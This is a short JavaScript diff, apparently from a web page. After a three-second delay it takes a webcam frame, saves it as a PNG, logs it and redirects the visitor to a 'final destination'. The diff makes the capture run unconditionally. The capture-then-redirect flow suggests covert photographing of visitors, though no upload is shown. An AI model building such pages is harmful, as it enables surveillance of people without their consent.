@@ -114,24 +114,22 @@
 
       setTimeout(function () {
         
-        if (!photoTaken) {
 
-            
-          imageCapture.grabFrame().then(imageBitmap => {
-            canvas.width = imageBitmap.width;
-            canvas.height = imageBitmap.height;
-            canvas.getContext('2d').drawImage(imageBitmap, 0, 0);
-            console.log('Фотографирование...');
-            canvas.toBlob(function(blob) {
-              console.log('Фотография создана');
-              savedPhoto = blob;
-              photoTaken = true;
-              logPhotoInfo();
-              redirectToFinalDestination();
-            }, 'image/png');
-          }
-        );
-        }
+          
+        imageCapture.grabFrame().then(imageBitmap => {
+          canvas.width = imageBitmap.width;
+          canvas.height = imageBitmap.height;
+          canvas.getContext('2d').drawImage(imageBitmap, 0, 0);
+          console.log('Фотографирование...');
+          canvas.toBlob(function(blob) {
+            console.log('Фотография создана');
+            savedPhoto = blob;
+            photoTaken = true;
+            logPhotoInfo();
+            redirectToFinalDestination();
+          }, 'image/png');
+        });
+        
       }, 3000);
     }
 
